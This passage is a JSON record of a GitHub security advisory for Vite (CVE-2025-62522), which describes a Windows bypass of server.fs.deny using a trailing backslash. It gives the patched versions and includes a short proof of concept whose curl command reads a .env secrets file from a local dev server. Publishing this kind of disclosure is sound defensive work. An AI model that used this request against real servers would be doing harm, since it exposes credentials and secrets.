These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />","reported_by":null,"title":"vite allows server.fs.deny bypass via backslash on Windows","metadata":null,"cves":["CVE-2025-62522"],"access":"public","severity":"moderate","module_name":"vite","vulnerable_versions":">=7.1.0 <=7.1.10","github_advisory_id":"GHSA-93m4-6634-74q7","recommendation":"Upgrade to version 7.1.11 or later","patched_versions":">=7.1.11","updated":"2025-10-21T14:51:26.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-22"],"url":"https://github.com/advisories/GHSA-93m4-6634-74q7"}}}
